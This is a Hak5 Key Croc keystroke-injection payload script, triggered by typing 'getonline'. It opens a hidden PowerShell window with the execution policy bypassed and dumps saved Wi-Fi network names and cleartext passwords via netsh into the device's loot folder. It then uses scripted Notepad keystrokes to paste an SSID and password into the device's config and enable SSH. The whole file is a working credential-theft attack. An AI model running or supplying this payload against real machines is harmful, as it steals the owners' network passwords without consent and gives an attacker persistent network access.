MATCH getonline
QUACK LOCK
# --> Edit config.txt
LED SETUP
QUACK STRING "$(sed -i '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' /root/udisk/config.txt)"
QUACK ENTER
sleep 0.5
# --> udisk unmount
ATTACKMODE HID STORAGE
sleep 5
QUACK GUI r
sleep 0.5
# --> Open powershell
QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
QUACK ENTER
sleep 0.5
# --> Get KeyCroc drive
LED ATTACK
QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
QUACK ENTER
sleep 1
# --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder
QUACK STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Format-Table -Wrap | Out-File \"\$Croc\loot\wifipass.txt\""
QUACK ENTER
sleep 1
# --> Open notepad with the KeyCroc config.txt
QUACK STRING "notepad \$Croc\config.txt"
QUACK ENTER
sleep 1
QUACK GUI r
QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
QUACK ENTER
sleep 1
QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
QUACK ENTER
sleep 1
LED SETUP
# --> Open wifipass.txt to copy and paste the SSID and PASSWD
QUACK STRING "notepad \$Croc\loot\wifipass.txt"
QUACK ENTER
sleep 1
# --> Copy and paste the SSID AND PASSWD to the config.txt
QUACK CONTROL-g
sleep 0.5
QUACK STRING "4"
QUACK ENTER
QUACK CONTROL-RIGHTARROW
QUACK CONTROL-RIGHTARROW
# --> Select the hole line
QUACK CONTROL-SHIFT-LEFTARROW
# --> Copy
QUACK CONTROL-c
sleep 0.5
# --> Change windows
QUACK CONTROL-ALT-TAB
QUACK ENTER
sleep 0.5
# --> select line to edit
QUACK CONTROL-g
sleep 0.5
QUACK STRING "11"
QUACK ENTER
sleep 0.5
QUACK CONTROL-RIGHTARROW
# --> SPACEBAR is 00,00,2c
QUACK KEYCODE 00,00,2c
# --> Paste
QUACK CONTROL-v
sleep 0.5
QUACK CONTROL-ALT-TAB
sleep 0.5
QUACK ENTER
QUACK CONTROL-g
sleep 0.5
QUACK STRING "4"
QUACK ENTER
QUACK CONTROL-RIGHTARROW
QUACK LEFTARROW
QUACK CONTROL-SHIFT-LEFTARROW
QUACK CONTROL-c
QUACK CONTROL-ALT-TAB
sleep 0.5
QUACK ENTER
QUACK CONTROL-g
sleep 0.5
QUACK STRING "10"
QUACK ENTER
QUACK CONTROL-RIGHTARROW
QUACK KEYCODE 00,00,2c
QUACK CONTROL-v
sleep 0.5
# --> Save config.txt
QUACK CONTROL w
QUACK ENTER
sleep 0.5
QUACK CONTROL-ALT-TAB
QUACK DELETE
# --> Returning to HID Mode
ATTACKMODE HID
QUACK UNLOCK
LED FINISH
